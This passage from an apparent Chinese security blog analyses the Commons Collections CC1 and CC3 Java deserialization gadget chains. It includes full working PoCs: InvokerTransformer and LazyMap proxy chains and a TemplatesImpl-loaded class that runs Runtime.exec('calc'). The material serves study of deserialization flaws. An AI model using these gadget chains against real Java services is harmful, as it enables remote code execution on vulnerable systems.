&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个方法就很特别，在 <strong>动态代理中当调用代理的方法时会进行触发handler中的invoke</strong>,所以可以动态代理进行进一步利用，首先看一下利用条件</p>\n<ul>\n<li><strong>var4.equals(“equals”);</strong></li>\n<li><strong>var5.length != 0</strong></li>\n</ul>\n<p>即 <strong>不能调用equals方法</strong>和 <strong>必须是一个无参方法</strong></p>\n<p>随后还是在 AnnotationInvocationHandler 中凑巧发现了 readObject 中符合条件的函数调用，且参数 memberValues 可控</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Iterator var4 = <span class=\"keyword\">this</span>.memberValues.entrySet().iterator();</span><br></pre></td></tr></table></figure>\n\n<p><strong>通过代理一个Map类型，反序列化时通过 readObject 来触发 invoke，再触发 get 再触发 transform</strong></p>\n<h1 id=\"构造poc\"><a href=\"#构造poc\" class=\"headerlink\" title=\"构造poc\"></a>构造poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">               \t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        <span class=\"comment\">//chainedTransformer.transform(Runtime.class);</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map lazymap = LazyMap.decorate(map, chainedTransformer);  <span class=\"comment\">//一旦调用get方法，就实现rce</span></span><br></pre></td></tr></table></figure>\n\n<p>构造代理</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class=\"line\"><span class=\"comment\">//更改memberValues的值  实际的处理器</span></span><br><span class=\"line\"></span><br><span class=\"line\">Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class=\"line\"><span class=\"comment\">//创建代理传入类加载器、接口、处理器</span></span><br><span class=\"line\"></span><br><span class=\"line\">Object o = cons.newInstance(Retention.class,proxymap);</span><br><span class=\"line\"><span class=\"comment\">//最后序列化这个类</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC1</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        <span class=\"comment\">//chainedTransformer.transform(Runtime.class);</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map lazymap = LazyMap.decorate(map, chainedTransformer);  <span class=\"comment\">//一旦调用get方法，就实现rce</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class=\"line\">        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class=\"line\"></span><br><span class=\"line\">        Object o = cons.newInstance(Retention.class,proxymap);</span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/1103578a6975428d8a6bde2a3b1bdeab.png\"></p>\n","categories":["Java反序列化"]},{"title":"CommonsCollections-3","url":"/2023/12/25/CommonsCollections-3/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>通过 <strong>defineClass字节码加载任意类而拓宽的一条链子</strong>，但是在实际场景中，因为defineClass方法作用域却是不开放的，所以我们很很难直接利用到它，CC3的利用关键就是 <strong>TransletClassLoader</strong> 中的 <strong>defineClass</strong>调用了此方法，当过滤Runtime时，可以尝试利用</p>\n<a id=\"more\"></a>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>包 com.sun.org.apache.xalan.internal.xsltc.trax 中的 TemplatesImpl 中静态类 TransletClassLoader重写了 defineClass方法 default类型只能本包调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/2df068a465554071ad273ea9f53aebf2.png\"></p>\n<p>向上寻找调用处，<code>TemplatesImpl</code> 的 <code>defineTransletClasses</code>方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/84d4ee6c9eb94ea3b7449c699516cd08.png\"></p>\n<p>再往上找到 <code>TemplatesImpl</code> 的 <code>getTransletInstance</code> 私有属性方法，看到这里在调用 defineTransletClasses 之后有一个 <strong>newInstance()</strong> 的操作，这里就存在动态加载类的可能，由于 <code>getTransletInstance是private</code>，接着向上寻找</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/5b7dc9b1aae947978d05f1e66dbf5a3d.png\"></p>\n<p>只存在一处 <strong>public的newTransformer</strong> 方法，进行了调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/42e4e7d69bef4d7b9359018efda3307b.png\"></p>\n<p>大概流程就是触发 newTransformer 函数，触发链子</p>\n<h1 id=\"尝试构造\"><a href=\"#尝试构造\" class=\"headerlink\" title=\"尝试构造\"></a>尝试构造</h1><p>首先看一下构造函数，什么都没干，也就是说各种参数需要自己赋值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/ff297850e72d4f9ca60ddc368c884f40.png\"></p>\n<p>三个参数暂时不用管，进入<strong>getTransletInstance方法</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/9c54dfa8473b477093ff5351852080c7.png\"></p>\n<p>这里 <strong>_name</strong>需要赋，<strong>_class</strong>不需要赋值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/aab3bb225c5a457a97d8b8436629da89.png\"></p>\n<p>跟进 <strong>defineTransletClasses()</strong> 然后 <strong>_bytecodes</strong> ，<strong>_tfactory</strong>需要赋值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/186641d46c2644e9ab939342528b80d4.png\"></p>\n<p><strong>_bytecodes为二维数组在这个for循环中，设置 _class的值</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/0e3172586bc04103ba8e6321a23efab4.png\"></p>\n<p>这样构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\cys\\\\Desktop\\\\Test.class&quot;));</span><br><span class=\"line\">byte[][] codes &#x3D; &#123;code&#125;;</span><br><span class=\"line\">byteField.set(templates,codes);</span><br></pre></td></tr></table></figure>\n\n<p>看 <strong>_tfactory</strong>，transient类型变量无法序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/8d088255034846f88f38164c414134a1.png\"></p>\n<p>在readObject中进行了赋值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/7e27a39cde934348a881418650d042cb.png\"></p>\n<p>先正向测试这样构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Field tfactoryField &#x3D; tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class=\"line\">tfactoryField.setAccessible(true);</span><br><span class=\"line\">tfactoryField.set(templates,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>\n<p>再看</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/65f6f50f405746acbdfd69b365073008.png\"></p>\n<p>跟进 <strong>ABSTRACT_TRANSLET</strong>要求为</p>\n<p>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/74455ff0d0d043f0968107592bc4a758.png\"></p>\n<p>在构造恶意类时这样，该导入导入，该重写重写</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Calc</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        </span><br><span class=\"line\">        Class tc = templates.getClass();</span><br><span class=\"line\">        Field nameField = tc.getDeclaredField(<span class=\"string\">&quot;_name&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        nameField.set(templates,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field byteField = tc.getDeclaredField(<span class=\"string\">&quot;_bytecodes&quot;</span>);</span><br><span class=\"line\">        byteField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;D:/cc1/target/classes/Calc.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        byteField.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field tfactoryField = tc.getDeclaredField(<span class=\"string\">&quot;_tfactory&quot;</span>);</span><br><span class=\"line\">        tfactoryField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        tfactoryField.set(templates,<span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\">        </span><br><span class=\"line\">        templates.newTransformer();</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样，在<strong>类运行时执行了static代码块</strong></p>\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><p>这样就可以用newTransformer方法执行任意代码，直接利用cc1中的 <strong>LazyMap</strong> 或者 <strong>TransformedMap</strong>的InvokerTransform.transformer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        Class tc = templates.getClass();</span><br><span class=\"line\">        Field nameField = tc.getDeclaredField(<span class=\"string\">&quot;_name&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        nameField.set(templates,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field byteField = tc.getDeclaredField(<span class=\"string\">&quot;_bytecodes&quot;</span>);</span><br><span class=\"line\">        byteField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;D:/cc1/target/classes/Calc.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        byteField.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field tfactoryField = tc.getDeclaredField(<span class=\"string\">&quot;_tfactory&quot;</span>);</span><br><span class=\"line\">        tfactoryField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        tfactoryField.set(templates,<span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//templates.newTransformer();</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(templates),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;newTransformer&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        <span class=\"comment\">//chainedTransformer.transform(1);</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map lazymap = LazyMap.decorate(map, chainedTransformer);  <span class=\"comment\">//一旦调用get方法，就实现rce</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class=\"line\">        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class=\"line\"></span><br><span class=\"line\">        Object o = cons.newInstance(Retention.class,proxymap);</span><br><span class=\"line\">        <span class=\"comment\">//serialize(o);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/77c53775196b4ecb99f8318e31b0b23c.png\"></p>\n<h1 id=\"ysoserial\"><a href=\"#ysoserial\" class=\"headerlink\" title=\"ysoserial\"></a>ysoserial</h1><p>使用 <strong>InstantiateTransformer</strong> 来替代 InvokerTransformer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InstantiateTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>作者向上寻找调用newTransformer处，在 <strong>TrAXFilter.java</strong> 发现 templates可控，但是这个类 <strong>没有继承serializable接口</strong> 无法序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/c23ca175c07a4890bb7d6cf914259fe9.png\"></p>\n<p>为了解决这一问题，作者寻找到 <strong>InstantiateTransformer</strong>中的 <strong>transform方法</strong>实例化 TrAXFilter</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/cdacb1f0c6394d37a3045ee7a5ba2854.png\"></p>\n<h1 id=\"poc2\"><a href=\"#poc2\" class=\"headerlink\" title=\"poc2\"></a>poc2</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> 